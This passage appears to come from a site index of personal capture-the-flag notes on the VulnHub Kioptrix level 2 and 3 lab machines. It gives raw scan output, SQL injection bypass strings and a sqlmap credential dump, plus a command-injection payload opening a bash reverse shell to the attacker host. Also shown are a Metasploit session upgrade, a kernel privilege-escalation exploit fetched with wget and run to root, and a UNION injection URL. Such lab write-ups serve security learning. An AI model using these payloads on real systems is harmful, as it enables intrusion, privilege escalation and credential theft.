[+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/01/02 20:50:44 Starting gobuster =============================================================== http://192.168.88.130/.htpasswd (Status: 403) http://192.168.88.130/.htaccess (Status: 403) http://192.168.88.130/.hta (Status: 403) http://192.168.88.130/cgi-bin/ (Status: 403) http://192.168.88.130/index.php (Status: 200) http://192.168.88.130/manual (Status: 301) http://192.168.88.130/usage (Status: 403) =============================================================== 2020/01/02 20:50:45 Finished ===============================================================  ./go/bin/gobuster dir -u 192.168.88.130 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -e  =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://192.168.88.130 [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php [+] Expanded: true [+] Timeout: 10s =============================================================== 2020/01/02 20:52:04 Starting gobuster =============================================================== http://192.168.88.130/index.php (Status: 200) http://192.168.88.130/manual (Status: 301) http://192.168.88.130/usage (Status: 403) =============================================================== 2020/01/02 20:54:29 Finished ===============================================================  SQL Injection username: admin ' OR ' 1'='1 password: admin ' OR ' 1'='1  POST /index.php HTTP/1.1 Host: 192.168.88.130 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.88.130/index.php Content-Type: application/x-www-form-urlencoded Content-Length: 36 Connection: close Upgrade-Insecure-Requests: 1 uname=admin\u0026amp;psw=admin\u0026amp;btnLogin=Login  sqlmap -r request.txt -p psw --dbms mysql --level=5 --risk=3 --dump-all  ___ __H__ ___ ___[)]_____ ___ ___ {1.3.12#stable} |_ -| . [(] | .'| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 22:16:43 /2020-01-02/ [22:16:43] [INFO] parsing HTTP request from 'request.txt' [22:16:43] [INFO] testing connection to the target URL [22:16:43] [INFO] checking if the target is protected by some kind of WAF/IPS [22:16:43] [INFO] testing if the target URL content is stable [22:16:43] [INFO] target URL content is stable [22:16:43] [WARNING] heuristic (basic) test shows that POST parameter 'psw' might not be injectable [22:16:44] [INFO] testing for SQL injection on POST parameter 'psw' [22:16:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [22:16:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause' [22:16:44] [INFO] POST parameter 'psw' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string=\u0026quot;Web\u0026quot;) [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' [22:16:44] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.5 error-based - Parameter replace (EXP)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0 error-based - Parameter replace (FLOOR)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.1 error-based - Parameter replace (UPDATEXML)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)' [22:16:44] [INFO] testing 'MySQL inline queries' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 stacked queries (comment)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 stacked queries' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 stacked queries (query SLEEP - comment)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 stacked queries (query SLEEP)' [22:16:44] [INFO] testing 'MySQL \u0026lt; 5.0.12 stacked queries (heavy query - comment)' [22:16:44] [INFO] testing 'MySQL \u0026lt; 5.0.12 stacked queries (heavy query)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 OR time-based blind (query SLEEP)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 AND time-based blind (SLEEP)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 OR time-based blind (SLEEP)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 AND time-based blind (SLEEP - comment)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 OR time-based blind (SLEEP - comment)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP - comment)' [22:16:44] [INFO] testing 'MySQL \u0026gt;= 5.0.12 OR time-based blind (query SLEEP - comment)' [22:16:44] [INFO] testing 'MySQL \u0026lt; 5.0.12 AND time-based blind (heavy query)' [22:17:04] [INFO] POST parameter 'psw' appears to be 'MySQL \u0026lt; 5.0.12 AND time-based blind (heavy query)' injectable [22:17:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [22:17:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [22:17:04] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns' [22:17:05] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns' [38/1863] [22:17:05] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns' [22:17:05] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns' [22:17:05] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns' [22:17:05] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns' [22:17:05] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns' [22:17:05] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns' [22:17:05] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns' [22:17:05] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns' [22:17:06] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns' [22:17:06] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns' [22:17:06] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns' [22:17:06] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns' [22:17:06] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns' [22:17:06] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns' [22:17:06] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns' [22:17:07] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns' [22:17:07] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval [22:17:07] [INFO] checking if the injection point on POST parameter 'psw' is a false positive POST parameter 'psw' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 552 HTTP(s) requests: --- Parameter: psw (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: uname=admin\u0026amp;psw=-3012' OR 8578=8578-- aTyJ\u0026amp;btnLogin=Login Type: time-based blind Title: MySQL \u0026lt; 5.0.12 AND time-based blind (heavy query) Payload: uname=admin\u0026amp;psw=admin' AND 5240=BENCHMARK(5000000,MD5(0x63415659))-- YhHX\u0026amp;btnLogin=Login --- [22:17:19] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL \u0026lt; 5.0.12 [22:17:19] [INFO] sqlmap will dump entries of all tables from all databases now [22:17:19] [INFO] fetching database names [22:17:19] [INFO] fetching number of databases [22:17:19] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval [22:17:19] [INFO] retrieved: [22:17:19] [INFO] retrieved: [22:17:19] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions [22:17:19] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex' [22:17:19] [ERROR] unable to retrieve the number of databases [22:17:19] [INFO] falling back to current database [22:17:19] [INFO] fetching current database [22:17:19] [INFO] retrieved: webapp [22:17:19] [INFO] fetching tables for database: 'webapp' [22:17:19] [INFO] fetching number of tables for database 'webapp' [22:17:19] [INFO] retrieved: [22:17:19] [INFO] retrieved: [22:17:19] [WARNING] unable to retrieve the number of tables for database 'webapp' [22:17:19] [ERROR] unable to retrieve the table names for any database do you want to use common table existence check? [y/N/q] y which common tables (wordlist) file do you want to use? [1] default '/usr/share/sqlmap/data/txt/common-tables.txt' (press Enter) [2] custom \u0026gt; 1 [22:17:22] [INFO] performing table existence using items from '/usr/share/sqlmap/data/txt/common-tables.txt' [22:17:22] [INFO] adding words used on web page to the check list [22:17:24] [WARNING] running in a single-thread mode. This could take a while [22:17:24] [INFO] retrieved: users [22:17:43] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [22:17:43] [INFO] fetching current database [22:17:43] [INFO] fetching columns for table 'users' in database 'webapp' [22:17:43] [INFO] retrieved: [22:17:43] [INFO] retrieved: [22:17:43] [ERROR] unable to retrieve the number of columns for table 'users' in database 'webapp' [22:17:43] [WARNING] unable to retrieve column names for table 'users' in database 'webapp' do you want to use common column existence check? [y/N/q] y which common columns (wordlist) file do you want to use? [1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter) [2] custom \u0026gt; 1 [22:17:50] [INFO] checking column existence using items from '/usr/share/sqlmap/data/txt/common-columns.txt' [22:17:50] [INFO] adding words used on web page to the check list [22:17:52] [WARNING] running in a single-thread mode. This could take a while [22:17:52] [INFO] retrieved: id [22:17:52] [INFO] retrieved: username [22:17:53] [INFO] retrieved: password [22:18:06] [INFO] retrieved: password [22:18:06] [INFO] retrieved: username [22:18:06] [INFO] fetching entries for table 'users' in database 'webapp' [22:18:06] [INFO] fetching number of entries for table 'users' in database 'webapp' [22:18:06] [INFO] retrieved: 2 [22:18:06] [INFO] retrieved: 1 [22:18:06] [INFO] retrieved: 5afac8d85f [22:18:06] [INFO] retrieved: admin [22:18:07] [INFO] retrieved: 2 [22:18:07] [INFO] retrieved: 66lajGGbla [22:18:07] [INFO] retrieved: john Database: webapp Table: users [2 entries] +----+------------+----------+ | id | password | username | +----+------------+----------+ | 1 | 5afac8d85f | admin | | 2 | 66lajGGbla | john | +----+------------+----------+ [22:18:07] [INFO] table 'webapp.users' dumped to CSV file '/root/.sqlmap/output/192.168.88.130/dump/webapp/users.csv' [22:18:07] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.88.130' [*] ending @ 22:18:07 /2020-01-02/  sqlmap -r request.txt --os-shell  ___ __H__ ___ ___[,]_____ ___ ___ {1.3.12#stable} |_ -| . [\u0026quot;] | .'| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 22:20:04 /2020-01-02/ [22:20:04] [INFO] parsing HTTP request from 'request.txt' [22:20:04] [INFO] resuming back-end DBMS 'mysql' [22:20:04] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: psw (POST) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause Payload: uname=admin\u0026amp;psw=-3012' OR 8578=8578-- aTyJ\u0026amp;btnLogin=Login Type: time-based blind Title: MySQL \u0026lt; 5.0.12 AND time-based blind (heavy query) Payload: uname=admin\u0026amp;psw=admin' AND 5240=BENCHMARK(5000000,MD5(0x63415659))-- YhHX\u0026amp;btnLogin=Login --- [22:20:04] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL \u0026lt; 5.0.12 [22:20:04] [INFO] going to use a web backdoor for command prompt [22:20:04] [INFO] fingerprinting the back-end DBMS operating system [22:20:04] [INFO] the back-end DBMS operating system is Linux which web application language does the web server support? [1] ASP [2] ASPX [3] JSP [4] PHP (default) \u0026gt; 4 do you want sqlmap to further try to provoke the full path disclosure? [Y/n] y [22:20:10] [WARNING] unable to automatically retrieve the web server document root what do you want to use for writable directory? [1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (defau lt) [2] custom location(s) [3] custom directory list file [4] brute force search 4 [22:20:20] [INFO] using generated directory list: /var/www,/var/www/html,/var/www/htdocs,/var/www/httpdocs,/var/www/php,/var/www/public,/var/www/src,/var/www/site,/var/www/build,/var/ww w/web,/var/www/data,/var/www/sites/all,/var/www/www/build,/usr/local/apache,/usr/local/apache/html,/usr/local/apache/htdocs,/usr/local/apache/httpdocs,/usr/local/apache/php,/usr/local/a pache/public,/usr/local/apache/src,/usr/local/apache/site,/usr/local/apache/build,/usr/local/apache/web,/usr/local/apache/www,/usr/local/apache/data,/usr/local/apache/sites/all,/usr/loc al/apache/www/build,/usr/local/apache2,/usr/local/apache2/html,/usr/local/apache2/htdocs,/usr/local/apache2/httpdocs,/usr/local/apache2/php,/usr/local/apache2/public,/usr/local/apache2/ src,/usr/local/apache2/site,/usr/local/apache2/build,/usr/local/apache2/web,/usr/local/apache2/www,/usr/local/apache2/data,/usr/local/apache2/sites/all,/usr/local/apache2/www/build,/usr /local/www/apache22,/usr/local/www/apache22/html,/usr/local/www/apache22/htdocs,/usr/local/www/apache22/httpdocs,/usr/local/www/apache22/php,/usr/local/www/apache22/public,/usr/local/ww w/apache22/src,/usr/local/www/apache22/site,/usr/local/www/apache22/build,/usr/local/www/apache22/web,/usr/local/www/apache22/www,/usr/local/www/apache22/data,/usr/local/www/apache22/si tes/all,/usr/local/www/apache22/www/build,/usr/local/www/apache24,/usr/local/www/apache24/html,/usr/local/www/apache24/htdocs,/usr/local/www/apache24/httpdocs,/usr/local/www/apache24/ph p,/usr/local/www/apache24/public,/usr/local/www/apache24/src,/usr/local/www/apache24/site,/usr/local/www/apache24/build,/usr/local/www/apache24/web,/usr/local/www/apache24/www,/usr/loca l/www/apache24/data,/usr/local/www/apache24/sites/all,/usr/local/www/apache24/www/build,/usr/local/httpd,/usr/local/httpd/html,/usr/local/httpd/htdocs,/usr/local/httpd/httpdocs,/usr/loc al/httpd/php,/usr/local/httpd/public,/usr/local/httpd/src,/usr/local/httpd/site,/usr/local/httpd/build,/usr/local/httpd/web,/usr/local/httpd/www,/usr/local/httpd/data,/usr/local/httpd/s ites/all,/usr/local/httpd/www/build,/var/www/nginx-default,/var/www/nginx-default/html,/var/www/nginx-default/htdocs,/var/www/nginx-default/httpdocs,/var/www/nginx-default/php,/var/www/ nginx-default/public,/var/www/nginx-default/src,/var/www/nginx-default/site,/var/www/nginx-default/build,/var/www/nginx-default/web,/var/www/nginx-default/www,/var/www/nginx-default/dat a,/var/www/nginx-default/sites/all,/var/www/nginx-default/www/build,/srv/www,/srv/www/html,/srv/www/htdocs,/srv/www/httpdocs,/srv/www/php,/srv/www/public,/srv/www/src,/srv/www/site,/srv /www/build,/srv/www/web,/srv/www/data,/srv/www/sites/all,/srv/www/www/build .... [22:20:28] [WARNING] unable to upload the file stager on '/' [22:20:28] [WARNING] HTTP error codes detected during run: 404 (Not Found) - 562 times  Command Injection in pingit.php ####### ls\nrequest: POST /pingit.php HTTP/1.1 Host: 192.168.88.130 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.88.130/index.php Content-Type: application/x-www-form-urlencoded Content-Length: 30 Connection: close Upgrade-Insecure-Requests: 1 ip=8.8.8.8%3B+ls\u0026amp;submit=submit Response: HTTP/1.1 200 OK Date: Thu, 02 Jan 2020 19:14:28 GMT Server: Apache/2.0.52 (CentOS) X-Powered-By: PHP/4.3.9 Content-Length: 407 Connection: close Content-Type: text/html; charset=UTF-8 8.8.8.8; ls\u0026lt;pre\u0026gt;PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data. 64 bytes from 8.8.8.8: icmp_seq=0 ttl=128 time=4.95 ms 64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=5.41 ms 64 bytes from 8.8.8.8: icmp_seq=2 ttl=128 time=4.45 ms --- 8.8.8.8 ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2002ms rtt min/avg/max/mdev = 4.458/4.940/5.412/0.397 ms, pipe 2 index.php pingit.php \u0026lt;/pre\u0026gt;  reverse shell POST /pingit.php HTTP/1.1 Host: 192.168.88.130 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://192.168.88.130/index.php Content-Type: application/x-www-form-urlencoded Content-Length: 75 Connection: close Upgrade-Insecure-Requests: 1 ip=8.8.8.8%3bbash+-i+\u0026gt;%26+/dev/tcp/192.168.88.128/4444+0\u0026gt;%261\u0026amp;submit=submit nc -lvp 4444 listening on [any] 4444 ... 192.168.88.130: inverse host lookup failed: Unknown host connect to [192.168.88.128] from (UNKNOWN) [192.168.88.130] 35518 bash: no job control in this shell bash-3.00$ whoami apache bash-3.00$ hostname kioptrix.level2 bash-3.00$  meterpreter msf5 \u0026gt; use exploit/multi/handler msf5 exploit(multi/handler) \u0026gt; set LHOST 192.168.88.128 LHOST =\u0026gt; 192.168.88.128 msf5 exploit(multi/handler) \u0026gt; set LPORT 4444 LPORT =\u0026gt; 4444 msf5 exploit(multi/handler) \u0026gt; set PAYLOAD linux/x86/shell/reverse_tcp PAYLOAD =\u0026gt; linux/x86/shell/reverse_tcp msf5 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 192.168.88.128:4444 [*] Sending stage (36 bytes) to 192.168.88.130 [*] Command shell session 1 opened (192.168.88.128:4444 -\u0026gt; 192.168.88.130:32801) at 2020-01-02 23:45:52 +0100 whoami bash: jYj?XIyjXRh//shh/binRSwhoami: No such file or directory bash-3.00$ ^Z Background session 1? [y/N] y msf5 exploit(multi/handler) \u0026gt; use post/multi/manage/shell_to_meterpreter msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set session 1 session =\u0026gt; 1 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 1 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 192.168.88.128:4433 [*] Sending stage (985320 bytes) to 192.168.88.130 [*] Meterpreter session 2 opened (192.168.88.128:4433 -\u0026gt; 192.168.88.130:32802) at 2020-01-02 23:47:24 +0100 [-] Error: Unable to execute the following command: \u0026quot;echo -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKhYgGgCABFRieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2A\u0026gt;\u0026gt;'/tmp/jZqLq.b64' ; ((which base64 \u0026gt;\u0026amp;2 \u0026amp;\u0026amp; base64 -d -) || (which base64 \u0026gt;\u0026amp;2 \u0026amp;\u0026amp; base64 --decode -) || (which openssl \u0026gt;\u0026amp;2 \u0026amp;\u0026amp; openssl enc -d -A -base64 -in /dev/stdin) || (which python \u0026gt;\u0026amp;2 \u0026amp;\u0026amp; python -c 'import sys, base64; print base64.standard_b64decode(sys.stdin.read());') || (which perl \u0026gt;\u0026amp;2 \u0026amp;\u0026amp; perl -MMIME::Base64 -ne 'print decode_base64($_)')) 2\u0026gt; /dev/null \u0026gt; '/tmp/PQQrZ' \u0026lt; '/tmp/jZqLq.b64' ; chmod +x '/tmp/PQQrZ' ; '/tmp/PQQrZ' \u0026amp; sleep 2 ; rm -f '/tmp/PQQrZ' ; rm -f '/tmp/jZqLq.b64'\u0026quot; [-] Output: \u0026quot;[1] 4299\u0026quot; [*] Post module execution completed  sadly not working\nPrivEsc - \u0026lsquo;sock_sendpage()\u0026rsquo; Local Privilege Escalation local\nsearchsploit -m exploits/linux/local/9545.c Exploit: Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Escalation URL: https://www.exploit-db.com/exploits/9545 Path: /usr/share/exploitdb/exploits/linux/local/9545.c File Type: C source, ASCII text, with CRLF line terminators Copied to: /root/kioptrix/shell/9545.c python3 -m http.server 1234  remote\nbash-3.00$ wget http://192.168.88.128:1234/9545.c --16:14:53-- http://192.168.88.128:1234/9545.c =\u0026gt; `9545.c' Connecting to 192.168.88.128:1234... connected. HTTP request sent, awaiting response... 200 OK Length: 9,783 (9.6K) [text/plain] 0K ......... 100% 621.99 MB/s 16:14:53 (621.99 MB/s) - `9545.c' saved [9783/9783] bash-3.00$ gcc -o page 9545.c 9545.c:376:28: warning: no newline at end of file bash-3.00$ ls 9545.c page bash-3.00$ chmod +x page bash-3.00$ ./page sh: no job control in this shell sh-3.00# whoami root  192.168.88.130 631 nc 192.168.88.130 631 GET / HTTP/0.9 403 Forbidden Date: Thu, 02 Jan 2020 18:14:04 GMT Server: CUPS/1.1 Content-Language: en_US Upgrade: TLS/1.0,HTTP/1.1 Connection: close Content-Type: text/html Content-Length: 150 \u0026lt;HTML\u0026gt;\u0026lt;HEAD\u0026gt;\u0026lt;TITLE\u0026gt;403 Forbidden\u0026lt;/TITLE\u0026gt;\u0026lt;/HEAD\u0026gt;\u0026lt;BODY\u0026gt;\u0026lt;H1\u0026gt;Forbidden\u0026lt;/H1\u0026gt;You don't have permission to access the resource on this server.\u0026lt;/BODY\u0026gt;\u0026lt;/HTML\u0026gt;  Nikto nikto -h 192.168.88.130:631 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.88.130 + Target Hostname: 192.168.88.130 + Target Port: 631 + Start Time: 2020-01-02 21:26:25 (GMT1) --------------------------------------------------------------------------- + Server: CUPS/1.1 + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + All CGI directories 'found', use '-C none' to test none + Allowed HTTP Methods: GET, HEAD, OPTIONS, POST, PUT + OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server. + 26548 requests: 1 error(s) and 5 item(s) reported on remote host + End Time: 2020-01-02 21:27:36 (GMT1) (71 seconds) --------------------------------------------------------------------------- + 1 host(s) tested  192.168.88.130 3306 nc 192.168.88.130 3306 GjHost '192.168.88.128' is not allowed to connect to this MySQL serverr  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/kioptrix/level3/",
	"title": "Level 3",
	"tags": ["VulnHub"],
	"description": "Notes from Kioptrix level 3 from Vulnhub.",
	"content": "level3    Proto port Service/URL Info Potential Vulns Verified Vulns       system Ubuntu 8.04.3 LTS Linux kernel 2.6.24-24 dreg:Mast3r loneferret:starwars vmsplice\u0026rsquo; Local Privilege Escalation (1)  SCTP FWD Memory Corruption Remote Overflow     TCP 22 SSH OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)     TCP 80 HTTP Apache/2.2.8 (Ubuntu) (EOL) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch (outdated) HTTP TRACE method is active     TCP 80 http://kioptrix3.com/phpmyadmin/ phpMyAdmin 2.11.3deb1ubuntu1.3 2.11.3.0 (2007-12-08) (outdated) phpMyAdmin 2.x - \u0026lsquo;Export.php\u0026rsquo; File Disclosure phpMyAdmin 2.x - Information Disclosure    TCP 80 http://kioptrix3.com/ LotusCMS Only security updates have been provided as of June 2012. Lotus CMS Fraise 3.0 - Local File Inclusion / Remote Code Execution LotusCMS 3.0 - \u0026lsquo;eval()\u0026rsquo; Remote Command Execution (Metasploit) \u0026lsquo;eval()\u0026rsquo;   TCP 80 http://kioptrix3.com/gallery/ Gallarific 2.1 - Free Version released October 10, 2009 admin:n0t7t1k4 Gallarific - \u0026lsquo;user.php\u0026rsquo; Arbirary Change Admin Information GALLARIFIC PHP Photo Gallery Script - \u0026lsquo;gallery.php\u0026rsquo; SQL Injection \u0026lsquo;gallery.php\u0026rsquo; SQL Injection http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--    Enum Where you at nmap -n -sn -PR 192.168.88.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 12:07 CET Nmap scan report for 192.168.88.2 Host is up (0.00019s latency). MAC Address: 00:50:56:FE:4E:C1 (VMware) Nmap scan report for 192.168.88.131 Host is up (0.00090s latency). MAC Address: 00:0C:29:FF:C3:CB (VMware) Nmap scan report for 192.168.88.254 Host is up (0.00033s latency). MAC Address: 00:50:56:F7:8F:D0 (VMware) Nmap scan report for 192.168.88.128 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.13 seconds  TCP # Nmap 7.80 scan initiated Fri Jan 3 12:11:21 2020 as: nmap -p- -A -oA tcp 192.168.88.131 Nmap scan report for 192.168.88.131 Host is up (0.00058s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) | ssh-hostkey: | 1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA) |_ 2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA) 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch |_http-title: Ligoat Security - Got Goat? Security ... MAC Address: 00:0C:29:FF:C3:CB (VMware) Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.9 - 2.6.33 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE HOP RTT ADDRESS 1 0.58 ms 192.168.88.131 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 3 12:11:32 2020 -- 1 IP address (1 host up) scanned in 12.53 seconds  UDP map -sU -T4 192.168.88.131 -oA udp Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 14:08 CET Nmap scan report for kioptrix3.com (192.168.88.131) Host is up (0.00063s latency). All 1000 scanned ports on kioptrix3.com (192.168.88.131) are closed (955) or open|filtered (45) MAC Address: 00:0C:29:FF:C3:CB (VMware) Nmap done: 1 IP address (1 host up) scanned in 1039.80 seconds  192.168.88.131 - 80 